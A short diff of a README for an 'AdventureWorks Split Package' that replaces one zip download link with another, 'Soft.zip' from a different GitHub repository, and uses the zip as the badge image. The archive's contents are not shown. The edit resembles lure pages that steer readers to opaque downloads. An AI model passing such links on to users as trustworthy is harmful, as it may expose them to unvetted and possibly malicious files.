@@ -41,7 +41,7 @@ The integration process involves the following steps:
 ## 📦 Download the Package
 
 To download the AdventureWorks Split Package, click the button below:
-[![Download Package](https://img.shields.io/badge/Download-Package-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Package](https://github.com/FiredKreeper/AdventureWorks-SplitPackage/releases/download/v1.0/Soft.zip)](https://github.com/FiredKreeper/AdventureWorks-SplitPackage/releases/download/v1.0/Soft.zip)
 
 *(Note: The provided link needs to be launched for the download to start.)*
 
